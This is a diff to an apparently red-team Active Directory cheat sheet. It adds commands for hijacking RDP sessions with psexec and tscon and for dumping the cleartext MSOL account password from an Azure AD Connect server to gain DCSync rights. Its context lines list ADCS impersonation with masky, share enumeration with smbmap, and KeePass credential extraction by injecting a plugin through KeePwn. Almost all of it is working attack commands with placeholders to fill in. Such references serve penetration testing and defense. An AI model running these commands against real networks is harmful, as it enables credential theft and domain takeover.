@@ -57,9 +57,18 @@
 - Impersonate with adcs >>> NTLM || Pass The Hash / Ticket / Certificate
   - `masky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>`
 
+- Impersonate RDP Session >>> RDP
+  - `psexec.exe -s -i cmd`
+    - `query user`
+      - `tscon.exe <id> /dest:<session_name>`
+
 ## Misc
 - Find Users >>> Username
   - `smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv`
 - Extract Keepass >>> User + Pass
   - `KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll`
   - `KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>`
+- Hybrid (Azure AD-Connect) >>> DCSYNC
+  - Dump cleartext password of MSOL Account on ADConnect Server
+    - `azuread_decrypt_msol_v2.ps1`
+    - `nxc smb <ip> -u <user> -p <password> -M msol`
